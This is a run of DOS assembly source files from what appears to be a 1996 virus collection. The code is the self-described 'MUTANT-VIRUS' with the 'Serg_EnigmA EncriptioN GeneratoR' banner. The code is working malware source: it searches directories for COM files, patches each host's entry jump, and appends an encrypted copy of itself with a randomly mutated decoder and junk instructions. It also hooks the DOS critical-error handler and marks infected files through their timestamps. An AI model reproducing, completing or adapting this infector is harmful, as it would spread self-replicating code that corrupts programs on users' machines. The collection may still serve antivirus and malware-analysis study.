;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
        Push    Bx
        Xor     Ax,Ax
        Mov     Al,[Bp]+n_com
        Mov     Bl,03h
        Mul     Bl
        Add     Ax,03h
        Mov     word ptr d_dlina+[Bp],Ax
        Lea     Si,M1+[Bp]
        Xor     Di,Di
        MovSb
        Mov     Bx,offset dlina+[Bp]
        Add     Bx,Ax
        Add     Bx,107h
        Add     Bx,word ptr Gar+[Bp]
;================
        Dec     Bx
;================
        Mov     Es:[01h],Bx
        Lea     Si,I1+[Bp]
        Mov     Di,Ax
        Cld
        MovSw
        MovSb
        MovSw
        MovSw
        Add     Bx,lng
        Mov     Si,Ax
        Add     Si,03h
        Mov     Es:[Si],Bx
        Add     Si,03h
        Xor     Bx,Bx
        Sub     Bx,Ax
        Sub     Bx,4h
        Mov     byte ptr Es:[Si],Bl
;-------------------------------
        Pop     Bx
        Lea     Si,gat+[Bp]
        Mov     Di,6fdh
        MovSb
        MovSw
        Sub     Si,0dh
        Mov     Di,700h
        MovSb
        MovSw
        Lea     Si,I1+[Bp]
        Mov     Di,71bh
        MovSw
        MovSb
        MovSw
        MovSw
        Inc     Si
        Inc     Si
        MovSw
        Push    Bx
        Cld
        Call    dword ptr cody+[Bp]
        Pop     Bx
dry:
        Xor     Dx,Dx
        Push    Es
        Pop     Ds

        Mov     Cx,Ax
        Add     Cx,7h
        Mov     ax,4000h
        Int     21h
        Mov     cx,cod2_lng
        Mov     Dx,22h
        Mov     ax,4000h
        Int     21h
;-----------------------------------------------------------------------------

        Pop     Ds
        Mov     cx,[Bp]+offset time
        Mov     dx,[Bp]+offset date
        and     dx,0ff0eh
        or      dx,001ah
        Mov     ax,5701h
        Int     21h
        Mov     ah,3eh
        Int     21h

rt      PROC
        Call    R_Vec24
        Mov     Ah,49h
        Push    Es
        Pop     Bx
        Int     21h
        Push    Cs
        Pop     Es
        Push    Es
        Pop     Ds
        Push    100h
        Xor     Ax,Ax
        Xor     Cx,Cx
	Cwd	;        Xor     Dx,Dx
        Xor     Bx,Bx
        Ret
rt      ENDP
sc      ENDP
konec:
lng             =       $-Sc
Cod2_lng        =       $-Virn

END start
END

ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1698.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1859.ASM]ƒƒƒ
;11:41am 10-29-1996
        .MODEL tiny
        .186
        .code
        org 100h
start:
        jmp     sc
        db      200d dup(08h)
sc     PROC
        db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
decod   db      90h,90h,90h     ;\                                      YYY
        db      90h,90h,90h     ; \                                     YYY
        db      90h,90h,90h     ;  \                                    YYY
        db      90h,90h,90h     ;   \___DECODER                         YYY
        db      90h,90h,90h     ;   /                                   YYY
        db      90h,90h,90h     ;  /                                    YYY
        db      90h,90h,90h     ; /                                     YYY
        db      90h,90h,90h     ;/                                      YYY
        db      90h             ;-- INC {BX} {SI} {DI}                  Y
        db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
        db      90h,90h         ;-- JB  DECOD                           NY
Virn    PROC
        Mov     dx,0000h  ;--- KEY
        Mov     Sp,0fffeh
Virt:
        cld
	clc
        Push    Cs
        Pop     Ss
        Pushf
        Mov     Di,Sp
        Mov     Bx,[Di]
        Lahf
        Sub     Bx,Ax
        Xchg    Ax,Bx
        Xor     Al,Al
        Sub     Ah,70h
        Push    100h
        Xchg    Al,Ah
        Mov     Cx,4
        Push    Dx
        Mul     Cx
        Pop     Dx
        Sub     Di,Ax
        Mov     Ax,[Di]
        Sub     Ah,72h
        Xor     Al,Al
        Add     Dx,Ax
        Pop     Ax
        Pop     Ax
Virn    ENDP
        Call    opt
opt:    Pop     Bp
        Sub     Bp,offset opt
        Jmp     Cycl
Cd:
        Xor     Bx,Bx
        Jmp     Cycl
Cr:
        Mov     Bh,22h
Cycl:
        Lea     si,vir+[Bp]
        Mov     cx,lng /2d
        Push    Dx
crypt:
        Xor     word ptr [Si],Dx
        Inc     Si
        Sub     Dx,0deadh
        Inc     Si
        loop    crypt
        Pop     Dx
        Cmp     word ptr vir+[Bp],'?\'
        Jz      dr
        Cmp     Bh,22h
        Jne     Cr
        Inc     Dh
        Jmp     Cd
dr:
        jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000" ;00h
atrib   db      "0"                     ;15h
time    db      "00"                    ;16h
date    db      "00"                    ;18h
dlina   db      "0000"                  ;1Ah
new_f   db      "000000000000"          ;1Eh
new_j   db      "È00"
buf_j   db      "Õ ê"
;------------------------------------------------------------------------------
tabl    db      052h, 0fch, 05ah ;\     Nop
        db      0f6h, 017h, 090h ; \    Not b,[??]      +
        db      080h, 037h, 000h ;  \   Xor b,[??],K1   +       Key#-
        db      0c0h, 007h, 000h ;   \  Rol b,[??],K2   +       Key\_
        db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2   +       Key/
        db      0f6h, 01fh, 090h ;    / Neg b,[??]      +
        db      080h, 007h, 000h ;   /  Add b,[??],K3   +       Key\_
        db      080h, 02fh, 000h ;  /   Sub b,[??],K3   +       Key/
;----------------------------------/
M1      db      0bbh, 022h, 000h        ;---- [ MOV BX,xxxx ]
I1      db      043h                    ;---- [ INC BX ]
COM     db      081h, 0fbh, 0a0h, 07h   ;---- [ CMP xx,xxxx ]   +
J1      db      072h, 0e1h              ;---- [ JB xx ] e1 - 8
Gat     db      1eh
        db      06h
der     db      1fh
        db      0cbh
;--------------------------------------------------------------------------------
Cop     db      0dh,0ah
	db	"		…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª",0dh,0ah
	db	"		∫	Serg Enigma present:	   ∫",0dh,0ah
	db	"		∫   New MUTANT-VIRUS with [SEEG]   ∫",0dh,0ah
	db	"		∫ Serg_EnigmA EncriptioN GeneratoR ∫",0dh,0ah
	db	"		∫  Version 1.0 beta	25.10.96   ∫",0dh,0ah
	db	"		»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº",0dh,0ah,"$"
;--------------------------------------------------------------------------------
one     db      00h  ;\
        db      00h  ; \
        db      00h  ;  \
        db      00h  ;   \___{ äÆ¨°®≠†Ê®Ô ™Æ¨¨†≠§ §´Ô ß†/‡†ßË®‰‡Æ¢È®™†
        db      00h  ;   /
        db      00h  ;  /
        db      00h  ; /
        db      00h  ;/
;-----------------------------------------------------------------------
dir     db      00h
cody    db      0fdh,07h
seg_new dd      ?
b_reg   db      ?
n_com   db      ?
d_dlina dd      ?
vec24   dd      ?
gar     db      00h,00h

late:
        Lea     Si,buf_j+[Bp]
        Mov     Di,0100h
        Movsb
        Movsw
        Mov     byte ptr dir+[Bp],00h
        Push    Es
        Call    Set_Int_24
        Pop     Es
        Mov     Ax,4900h
        Int     21h
        Jc      rt
        Mov     Ax,4800h
        Mov     Bx,0FFFFh
        Int     21h
        Sub     Bx,85h ;-------\
        Jc      rt
        Mov     Ax,4a00h
        Int     21h
        Mov     Ax,4800h
        Mov     Bx,84h
        Int     21h
        Jc      Rt
        Mov     word ptr [Bp+seg_new],Ax
        Mov     Es,Ax
        Mov     Al,90h
        Xor     Di,Di
        Mov     Cx,840h
        Rep     Stosb
        Mov     Ah,2ch
        Int     21h
        Cmp     Dh,22h
        Jnz     drop
        Call    Mes
drop:
        Push    Es
        Call    G_gar
        Pop     Es
        Call    gkey  ;è‡ÆÊ•§„‡† £•≠•‡†Ê®® 3-•Â ™´ÓÁ•© ® ß†≠•·•≠®Ô ®Â ¢ ‚†°´®Ê„
        Lea     Si,one+[Bp]
        Mov     Ax,Dx
        Xor     Bx,Bx
        Call    rand
        Xor     Ax,1234h
        call    rand
        Mov     Ax,Word Ptr [Si]
        Xor     Ah,Ah
        Mov     Bl,02h
        Div     Bl
        Xor     Ah,Ah
        Mov     byte ptr [Bp]+b_reg,Al
        Push    Si
        Lea     Si,tabl+[Bp]
        Call    mreg    ; è‡ÆÊ•§„‡† ®Ì¨•≠•≠®Ô °†ßÆ¢ÎÂ ‡•£®·‚‡Æ¢ ¢ ‚†°´®Ê•
        Pop     Si
        Mov     ax,word ptr [Si]+01
        Cmp     al,00h
        Jnz     no
        Inc     Ax
no:
        Cmp     byte ptr [Si],00h
        Jnz     mo
        Inc     byte ptr [Si]
mo:
        Xor     Ah,Ah
        Mov     Bl,02h
        Div     Bl
        Xor     Ah,Ah
        Inc     Al
        Mov     byte ptr [Bp+n_com],Al
        Xchg    Cx,Ax
        Mov     Ax,word ptr [Bp+seg_new]
        Mov     Es,Ax
        Xor     Ch,Ch
        Xor     Ax,Ax
        Mov     Di,0003h
        Xor     Bx,Bx
        Mov     Dx,24d
Cycle:
        Call    Comp    ; É•≠•‡†Ê®Ô ØÆ·´•§Æ¢†‚•´Ï≠Æ·‚® ™Æ¨†≠§
        Inc     Si
        Add     Bx,0003h
        Sub     Dx,0003h
        Loop    Cycle
        Push    Cs
        Pop     Es
        Jmp     Virus
;------ èÆ§Ø‡Æ£‡†¨¨Î ----------------------------------------------------------
Comp:
        Cmp     byte ptr [Si],00h
        Jnz     Set_0
        Mov     Al,00d
        Jmp     vit
Set_0:
        Cmp     byte ptr [Si],01h
        Jnz     Set_1
        Mov     Al,03d
        Jmp     vit
Set_1:
        Cmp     byte ptr [Si],02h
        Jnz     Set_2
        Mov     Al,06d
        Jmp     vit
Set_2:
        Cmp     byte ptr [Si],03h
        Jnz     Set_3
        Mov     Al,09d
        Jmp     vit
Set_3:
        Cmp     byte ptr [Si],04h
        Jnz     Set_4
        Mov     Al,12d
        Jmp     vit
Set_4:
        Cmp     byte ptr [Si],05h
        Jnz     Set_5
        Mov     Al,15h
        Jmp     vit
Set_5:
        Cmp     byte ptr [Si],06h
        Jnz     Set_6
        Mov     Al,18d
        Jmp     vit
Set_6:
        Cmp     byte ptr [Si],07h
        Jnz     Set_7
        Mov     Al,21d
        Jmp     vit
Set_7:
        Cmp     byte ptr [Si],08h
        Jnz     Set_8
        Mov     Al,21d
        Jmp     vit
Set_8:
        Cmp     byte ptr [Si],09h
        Jnz     Set_9
        Mov     Al,18d
        Jmp     vit
Set_9:
        Cmp     byte ptr [Si],0ah
        Jnz     Set_a
        Mov     Al,15d
        Jmp     vit
Set_a:
        Cmp     byte ptr [Si],0bh
        Jnz     Set_b
        Mov     Al,12d
        Jmp     vit
Set_b:
        Cmp     byte ptr [Si],0ch
        Jnz     Set_c
        Mov     Al,09d
        Jmp     vit
Set_c:
        Cmp     byte ptr [Si],0dh
        Jnz     Set_d
        Mov     Al,06d
        Jmp     vit
Set_d:
        Cmp     byte ptr [Si],0eh
        Jnz     Set_e
        Mov     Al,03d
        Jmp     vit
Set_e:
        Cmp     byte ptr [Si],0fh
        Jnz     Set_f
        Mov     Al,00h
        Jmp     vit
Set_f:
        Jmp     rt

set:
        Rol Ax,Cl
        Xor Ah,Ah
        Div Ch
        Mov byte ptr [Si]+[Bx],Al
        Inc Bx
        Ret
Mes:
        Push    Dx
        Mov     Ah,09h
        Lea     Dx,Cop+[Bp]
        Int     21h
        Pop     Dx
        Ret

ort:	Movsb
        Movsw
        ret

res:	Cmp     Al,09h
        Jnz     d1
        Mov     Al,0ch
        Ret
d1:	Cmp     Al,0ch
        Jnz     d2
        Mov     Al,09h
        Ret
d2:	Cmp     Al,12h
        Jnz     d3
        Mov     Al,15h
        Ret
d3:	Cmp     Al,15h
        Jnz     d4
        Mov     Al,12h
d4:	Ret

rand:	push    Ax
        Mov     ch,10h
        Xor     Cl,Cl
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,04h
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,08h
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,0ch
        Call    set
        Pop     Ax
        Ret

R_Vec24        PROC
                Push    word ptr Vec24+[Bp]
                Pop     Ds
                Mov     Dx,word ptr Vec24+[Bp]+2
                Mov     Ax,2524h
                Int     21h
                Ret
R_Vec24        ENDP

Set_Int_24:	Mov     Ax,3524h
                Int     21h
                Mov     word ptr Vec24+[Bp]+2,Bx
                Mov     word ptr Vec24+[Bp],Es
                Push    Cs
                Pop     Ds
                Mov     Ax,2524h
                Lea     Dx,intr24+[Bp]
                Int     21h
                Ret

;Intr21        PROC
;       db      09ah
;       vector  dd      ?
;               ret
;Intr21        ENDP

Intr24:
        Mov     Al,3h
        Iret

vit:
        Push    Si
        Push    Di
        Push    Si
        Lea     Si,tabl+[Bp]
        Add     Si,Ax
        Add     Di,Bx
        Call    ort
        Pop     Si
        Pop     Di
        Call    res
        Push    Di
        Push    Si
        Lea     Si,tabl+[Bp]
        Add     Si,Ax
        Mov     Di,800h ;-------------------------??????????
        Add     Di,Dx
        Call    ort
        Pop     Si
        Pop     Di
        Pop     Si
        Ret
mreg:
        Cmp     Al,01h
        Jnz     q1
        Jmp     Bx_r
q1:
        Cmp     Al,02h
        Jnz     Si_r
Di_r:
        Mov     byte ptr [Si]+04h,15h
        Mov     byte ptr [Si]+07h,35h
        Mov     byte ptr [Si]+0ah,05h
        Mov     byte ptr [Si]+0dh,0dh
        Mov     byte ptr [Si]+10h,1dh
        Mov     byte ptr [Si]+13h,05h
        Mov     byte ptr [Si]+16h,2dh
        Mov     byte ptr [Si]+18h,0bfh
        Mov     byte ptr [Si]+1bh,47h
        Mov     byte ptr [Si]+1dh,0ffh
        Ret
Si_r:
        Mov     byte ptr [Si]+04h,14h
        Mov     byte ptr [Si]+07h,34h
        Mov     byte ptr [Si]+0ah,04h
        Mov     byte ptr [Si]+0dh,0ch
        Mov     byte ptr [Si]+10h,1ch
        Mov     byte ptr [Si]+13h,04h
        Mov     byte ptr [Si]+16h,2ch
        Mov     byte ptr [Si]+18h,0beh
        Mov     byte ptr [Si]+1bh,46h
        Mov     byte ptr [Si]+1dh,0feh
        Ret
Bx_r:
        Mov     byte ptr [Si]+04h,17h
        Mov     byte ptr [Si]+07h,37h
        Mov     byte ptr [Si]+0ah,07h
        Mov     byte ptr [Si]+0dh,0fh
        Mov     byte ptr [Si]+10h,1fh
        Mov     byte ptr [Si]+13h,07h
        Mov     byte ptr [Si]+16h,2fh
        Mov     byte ptr [Si]+18h,0bbh
        Mov     byte ptr [Si]+1bh,43h
        Mov     byte ptr [Si]+1dh,0fbh
        Ret

G_gar:
;        Push    Dx
        Push    Cs
        Pop     Es
        Mov     Cx,Dx
        Shr     Cx,08
        Shl     Cl,04
        Mov     Ax,Cx
        Mov     Cx,Dx
        Shl     Cx,08
        Xchg    Ch,Cl
        Rol     Cl,04
        Shr     Cl,04
        Add     Cx,Ax
        Jp      l1
        Dec     Cx
        Jp      l1
        Dec     Cx
L1:
        Mov     Ax,Cx
        Mov     word ptr [Bp]+gar,Al
        Mov     Bl,2
        Div     Bl
        Xor     Ah,Ah
        Xchg    Ax,Cx
;        Pop     Dx
        Push    Dx
        Lea     Di,konec+[Bp]+2
        Cld
cyl:
        Call    trash
        StoSw
        Add     Dx,0bedah
        Loop    cyl
        Dec     Di
        Dec     Di
        Mov     Ax,0f8fch
        StoSw
        Pop     Dx
        Ret
trash:
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 1 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot:   Shr     Bx,8
        Shr     Bx,4
        Rol     Bl,4
        Cmp     Bl,00h
        Jz      n1
        Cmp     Bl,10h
        Jz      n1
        Cmp     Bl,20h
        Jz      n1
        Cmp     Bl,30h
        Jz      n1
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot
n1:     Mov     Al,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 2 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
anot1:  Rol     Bx,4
        Shr     Bx,8
        Shr     Bx,4
        Cmp     Bl,2
        Jz      n2
        Cmp     Bl,4
        Jz      n2
        Cmp     Bl,10
        Jz      n2
        Cmp     Bl,11
        Jz      n2
        Cmp     Bl,12
        Jz      n2
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot1
n2:     Add     Al,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 3 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot2:  Shr     Bx,8
        Shr     Bl,4
        Shl     Bl,4
        Cmp     Bl,00h
        Jz      n3
        Cmp     Bl,10h
        Jz      n3
        Cmp     Bl,20h
        Jz      n3
        Cmp     Bl,30h
        Jz      n3
        Cmp     Bl,0c0h
        Jz      n3
        Cmp     Bl,0d0h
        Jz      n3
        Cmp     Bl,0f0h
        Jz      n3
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot2
n3:     Mov     Ah,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 4 }ƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot3:  Shl     Bx,8
        Shl     Bh,4
        Ror     Bh,4
        Cmp     Bh,6
        Jnz     n4
        Cmp     Bh,12
        Jnz     n4
        Cmp     Bh,14
        Jnz     n4
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     Anot3
n4:     Add     Ah,Bh
        ret
gkey:
        Push    Dx
        Mov     [Si]+8h,Dl
        Mov     [Si]+0bh,Dh
        Mov     [Si]+0eh,Dh
        Add     Dh,Dl
        Mov     [Si]+14h,Dh
        Mov     [Si]+17h,Dh
        Pop     Dx
        Ret

;**************************************************** VIRUS START *************
Virus:
        Mov     ah,1ah
        Lea     Si,vir+[Bp]
        Mov     Dx,Si
        Add     Dx,0dh
        Int     21h
        Mov     Dx,Si
        Inc	Dx	;Add     dx,1h
find_f:
        Mov     ah,4eh
        Xor     Cx,Cx
        Int     21h
        jmp     ok
find_n:
        Mov     ah,4fh
        Int     21h

ok:
        jnb     chk
        cmp     al,12h
        jz      dg
        jmp     chk
dg:
        cmp     byte ptr [Bp]+dir,0ffh
        jnz     fg
        jmp     rt
fg:
        dec     dx
        Mov     byte ptr [Bp]+dir,0ffh
        jmp     find_f

chk:
        Mov     cx,[Bp]+offset time
        and     cx,001ah
        cmp     cx,001ah
        jz      find_n
        cmp     word ptr dlina+[Bp],62000d
        ja      find_n
        cmp     word ptr dlina+[Bp],0100h
        jb      find_n
        push    si
        Mov     di,si
        Add     di,0dh
        Add     si,02bh
        cmp     byte ptr [Bp]+dir,0ffh
        jnz     nam
        Mov     al,5ch
        stosb
nam:
        lodsb
        stosb
        cmp     al,00
        jnz     nam
        pop     Si
        Mov     dx,si
        Add     dx,00dh
        Mov     Cx,[Bp]+offset atrib
        Xor     Ch,Ch
        and     cx,0fffeh
        Mov     ax,4301h
        Int     21h
        Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
        Sub     ax,0003h
        Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
        Mov     al,02h
        Mov     ah,3dh
        Int     21h
        jnb     ar
        jmp     rt
ar:
        Mov     bx,ax
        Mov     ax,4200h
        Xor	Cx,Cx
	Cwd	;        Xor     Dx,Dx
        Int     21h
        Mov     ah,3fh
        Mov     cx,0003h
        Lea     dx,buf_j+[Bp]
        Int     21h
	Cmp     word ptr buf_j+[Bp],'ZM'
	Jnz     infect
	Mov     Ah,3eh
	Int     21h
	Jmp     find_n
infect:
        Lea     Si,virn+[Bp]
        Mov     Di,22h
        Push    word ptr seg_new+[Bp]
        Pop     Es
        Mov     Cx,cod2_lng
        Rep     Movsb
        Mov     ax,4200h
        Xor     cx,cx
	Cwd	;        Xor     dx,dx
        Int     21h
        Mov     ah,40h
        Mov     cx,0003h
        Lea     Dx,new_j+[Bp]
        Int     21h
        Mov     ax,4202h
        Xor     Cx,Cx
	Cwd	;	Xor     Dx,Dx
        Int     21h
        Mov     Ah,40h
        Lea     Dx,konec+[Bp]+2
        Mov     Cx,word ptr gar+[Bp]
        Dec     Cx
        Xor     Ch,Ch
        Int     21h
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
        Mov     Ah,2ch  ;          \
        Int     21h     ;            \
        Push    Ds      ;              \
        Mov     Cx,(Cod2_Lng /2d)-20h ;  \
        Mov     Si,8ah          ;          \
        Mov     Es:[23h],Dx ;                \
My:                             ;              >---------> 1-Ô á†Ë®‰‡Æ¢™†
        Xor     word ptr Es:[Si],Dx ;        /
        Inc     Si                  ;      /
        Sub     Dx,0DEADh	    ;    /
        Inc     Si                 ;   /
        Loop    My                ;  /
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
        Push    Bx
        Xor     Ax,Ax
        Mov     Al,[Bp]+n_com
        Mov     Bl,03h
        Mul     Bl
        Add     Ax,03h
        Mov     word ptr d_dlina+[Bp],Ax
        Lea     Si,M1+[Bp]
        Xor     Di,Di
        MovSb
        Mov     Bx,offset dlina+[Bp]
        Add     Bx,Ax
        Add     Bx,107h
        Add     Bx,word ptr Gar+[Bp]
;================
        Dec     Bx
;================
        Mov     Es:[01h],Bx
        Lea     Si,I1+[Bp]
        Mov     Di,Ax
        Cld
        MovSw
        MovSb
        MovSw
        MovSw
        Add     Bx,lng
        Mov     Si,Ax
        Add     Si,03h
        Mov     Es:[Si],Bx
        Add     Si,03h
        Xor     Bx,Bx
        Sub     Bx,Ax
        Sub     Bx,4h
        Mov     byte ptr Es:[Si],Bl
;-------------------------------
        Pop     Bx
        Lea     Si,gat+[Bp]
        Mov     Di,7fdh
        MovSb
        MovSw
        Sub     Si,0dh
        Mov     Di,800h
        MovSb
        MovSw
        Lea     Si,I1+[Bp]
        Mov     Di,81bh
        MovSw
        MovSb
        MovSw
        MovSw
        Inc     Si
        Inc     Si
        MovSw
        Push    Bx
        Cld
        Call    dword ptr cody+[Bp]
        Pop     Bx
dry:
        Xor     Dx,Dx
        Push    Es
        Pop     Ds

        Mov     Cx,Ax
        Add     Cx,7h
        Mov     ah,40h
        Int     21h
        Mov     cx,cod2_lng
        Mov     Dx,22h
        Mov     ax,4000h
        Int     21h
;-----------------------------------------------------------------------------

        Pop     Ds
        Mov     cx,[Bp]+offset time
        Mov     dx,[Bp]+offset date
        and     cx,0ff0eh
        or      cx,001ah
        Mov     ax,5701h
        Int     21h
        Mov     ah,3eh
        Int     21h

rt      PROC
        Call    R_Vec24
        Mov     Ah,49h
        Push    Es
        Pop     Bx
        Int     21h
        Push    Cs
        Pop     Es
        Push    Es
        Pop     Ds
        Push    100h
        Xor     Ax,Ax
        Xor     Cx,Cx
	Cwd	;        Xor     Dx,Dx
        Xor     Bx,Bx
        Ret
rt      ENDP
sc      ENDP
konec:
lng             =       $-Sc
Cod2_lng        =       $-Virn

END start
END

ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1859.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1870.ASM]ƒƒƒ
;11:41am 10-29-1996
        .MODEL tiny
        .186
        .code
        org 100h
start:
        jmp     sc
        db      200d dup(08h)
sc     PROC
        db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
decod   db      90h,90h,90h     ;\                                      YYY
        db      90h,90h,90h     ; \                                     YYY
        db      90h,90h,90h     ;  \                                    YYY
        db      90h,90h,90h     ;   \___DECODER                         YYY
        db      90h,90h,90h     ;   /                                   YYY
        db      90h,90h,90h     ;  /                                    YYY
        db      90h,90h,90h     ; /                                     YYY
        db      90h,90h,90h     ;/                                      YYY
        db      90h             ;-- INC {BX} {SI} {DI}                  Y
        db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
        db      90h,90h         ;-- JB  DECOD                           NY
Virn    PROC
        Mov     dx,0000h  ;--- KEY
        Mov     Sp,0fffeh
Virt:
        clc
        cld
        Push    Cs
        Pop     Ss
        Pushf
        Mov     Di,Sp
        Mov     Bx,[Di]
        Lahf
        Sub     Bx,Ax
        Xchg    Ax,Bx
        Xor     Al,Al
        Sub     Ah,70h
        Push    100h
        Xchg    Al,Ah
        Mov     Cx,4
        Push    Dx
        Mul     Cx
        Pop     Dx
        Sub     Di,Ax
        Mov     Ax,[Di]
        Sub     Ah,72h
        Xor     Al,Al
        Add     Dx,Ax
        Pop     Ax
        Pop     Ax
Virn    ENDP
        Call    opt
opt:    Pop     Bp
        Sub     Bp,offset opt
        Jmp     Cycl
Cd:
        Xor     Bx,Bx
        Jmp     Cycl
Cr:
        Mov     Bh,22h
Cycl:
        Lea     si,vir+[Bp]
        Mov     cx,lng /2d
        Push    Dx
crypt:
        Xor     word ptr [Si],Dx
        Inc     Si
        Sub     Dx,0deadh
        Inc     Si
        loop    crypt
        Pop     Dx
        Cmp     word ptr vir+[Bp],'?\'
        Jz      dr
        Cmp     Bh,22h
        Jne     Cr
        Inc     Dh
        Jmp     Cd
dr:
        jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000" ;00h
atrib   db      "0"                     ;15h
time    db      "00"                    ;16h
date    db      "00"                    ;18h
dlina   db      "0000"                  ;1Ah
new_f   db      "000000000000"          ;1Eh
new_j   db      "È00"
buf_j   db      "Õ ê"
;------------------------------------------------------------------------------
tabl    db      052h, 0fch, 05ah ;\     Nop
        db      0f6h, 017h, 090h ; \    Not b,[??]      +
        db      080h, 037h, 000h ;  \   Xor b,[??],K1   +       Key#-
        db      0c0h, 007h, 000h ;   \  Rol b,[??],K2   +       Key\_
        db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2   +       Key/
        db      0f6h, 01fh, 090h ;    / Neg b,[??]      +
        db      080h, 007h, 000h ;   /  Add b,[??],K3   +       Key\_
        db      080h, 02fh, 000h ;  /   Sub b,[??],K3   +       Key/
;----------------------------------/
M1      db      0bbh, 022h, 000h        ;---- [ MOV BX,xxxx ]
I1      db      043h                    ;---- [ INC BX ]
COM     db      081h, 0fbh, 0a0h, 07h   ;---- [ CMP xx,xxxx ]   +
J1      db      072h, 0e1h              ;---- [ JB xx ] e1 - 8
Gat     db      1eh
        db      06h
der     db      1fh
        db      0cbh
;--------------------------------------------------------------------------------
Cop     db      0dh,0ah
	db	"		…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª",0dh,0ah
	db	"		∫	Serg Enigma present:	   ∫",0dh,0ah
	db	"		∫   New MUTANT-VIRUS with [SEEG]   ∫",0dh,0ah
	db	"		∫ Serg_EnigmA EncriptioN GeneratoR ∫",0dh,0ah
	db	"		∫  Version 1.0 beta	25.10.96   ∫",0dh,0ah
	db	"		»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº",0dh,0ah,"$"
;--------------------------------------------------------------------------------
one     db      00h  ;\
        db      00h  ; \
        db      00h  ;  \
        db      00h  ;   \___{ äÆ¨°®≠†Ê®Ô ™Æ¨¨†≠§ §´Ô ß†/‡†ßË®‰‡Æ¢È®™†
        db      00h  ;   /
        db      00h  ;  /
        db      00h  ; /
        db      00h  ;/
;-----------------------------------------------------------------------
dir     db      00h
cody    db      0fdh,07h
seg_new dd      ?
b_reg   db      ?
n_com   db      ?
d_dlina dd      ?
vec24   dd      ?
gar     db      00h,00h

late:
        Lea     Si,buf_j+[Bp]
        Mov     Di,0100h
        Movsb
        Movsw
        Mov     byte ptr dir+[Bp],00h
        Push    Es
        Call    Set_Int_24
        Pop     Es
        Mov     Ax,4900h
        Int     21h
        Jc      rt
        Mov     Ax,4800h
        Mov     Bx,0FFFFh
        Int     21h
        Sub     Bx,85h ;-------\
        Jc      rt
        Mov     Ax,4a00h
        Int     21h
        Mov     Ax,4800h
        Mov     Bx,84h
        Int     21h
        Jc      Rt
        Mov     word ptr [Bp+seg_new],Ax
        Mov     Es,Ax
        Mov     Al,90h
        Xor     Di,Di
        Mov     Cx,840h
        Rep     Stosb
        Mov     Ah,2ch
        Int     21h
        Cmp     Dh,22h
        Jnz     drop
        Call    Mes
drop:
        Push    Es
        Call    G_gar
        Pop     Es
        Call    gkey  ;è‡ÆÊ•§„‡† £•≠•‡†Ê®® 3-•Â ™´ÓÁ•© ® ß†≠•·•≠®Ô ®Â ¢ ‚†°´®Ê„
        Lea     Si,one+[Bp]
        Mov     Ax,Dx
        Xor     Bx,Bx
        Call    rand
        Xor     Ax,1234h
        call    rand
        Mov     Ax,Word Ptr [Si]
        Xor     Ah,Ah
